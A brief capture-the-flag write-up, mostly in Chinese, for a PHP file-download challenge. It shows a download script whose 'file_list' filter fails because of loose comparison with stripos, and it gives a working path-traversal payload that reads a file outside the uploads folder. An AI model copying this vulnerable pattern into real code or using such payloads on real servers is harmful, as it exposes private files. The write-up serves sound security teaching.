# Challlenge
download.php
```php
<?php
$filename = $_GET['f'];
if(stripos($filename, 'file_list') != false) die();
header("Content-Type: application/octet-stream");
header("Content-Disposition: attachment; filename='$filename'");
readfile("uploads/$filename");
```

目标：读取位于上一层目录的file_list.php。

# Solution 
```
if(stripos($filename, 'file_list') != false) die();
```
strpos(str1,str2)返回字符串str2在字符串str1中的位置。如果`$filename`以file_list开头，则`stripos($filename, 'file_list')`会返回0，而采用的是`!=`，也就是说可能存在弱类型比较问题:0 == false。

payload:
```
download.php?f=file_list/../../file_list.php
```

# Refference
+ [TWCTF 2017-Freshen Uploader-writeup](https://chybeta.github.io/2017/09/02/TWCTF-2017-Freshen-Uploader-writeup/)
